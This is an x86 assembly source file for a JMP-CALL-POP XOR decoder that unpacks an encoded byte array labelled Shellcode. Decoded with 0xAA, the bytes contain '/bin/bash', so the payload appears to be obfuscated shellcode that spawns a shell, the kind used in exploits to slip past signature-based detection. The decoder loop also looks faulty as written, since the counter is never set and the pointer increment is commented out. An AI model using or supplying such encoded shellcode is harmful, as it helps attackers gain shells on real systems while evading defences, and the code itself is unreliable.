global _start
section .text
_start:

	jmp short call_decoder


decoder:
	pop esi

decode:
	xor dword [esi], 0xAAAAAAAA
	;inc esi
	loop decode

	jmp short Shellcode

call_decoder:
	call decoder
	Shellcode: db 0x41,0xb0,0xf4,0x9b,0x71,0x22,0xf4,0xa3,0x23,0xdc,0xa0,0x23,0xf4,0xa4,0x27,0xb4,0x27,0xe4,0xa0,0x27,0xfc,0xa4,0x9b,0x6a,0x1a,0xa1,0x67,0x2a,0x42,0x4b,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xc8,0xcb,0xd9,0xc2,0xeb,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9
